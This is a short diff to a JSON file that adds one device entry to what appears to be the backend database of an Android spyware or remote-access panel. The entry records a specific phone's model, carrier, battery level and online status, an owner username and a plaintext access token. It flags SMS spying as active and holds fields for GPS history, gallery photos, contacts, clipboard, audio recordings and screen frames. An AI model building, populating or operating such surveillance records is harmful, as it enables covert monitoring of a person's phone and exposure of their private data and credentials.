@@ -863,5 +863,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "aimlock_a108e409",
+    "deviceName": "TECNO LE7",
+    "ownerUsername": "Zal7Sex",
+    "token": "24c54afec236399b0350ae4ef8f449eb",
+    "lastSeen": 1776622456145,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-19T18:14:16.145Z",
+    "deviceInfo": {
+      "model": "TECNO MOBILE LIMITED TECNO LE7",
+      "androidVersion": "Android 11",
+      "battery": 22,
+      "network": "Seluler: Indosat Ooredoo",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
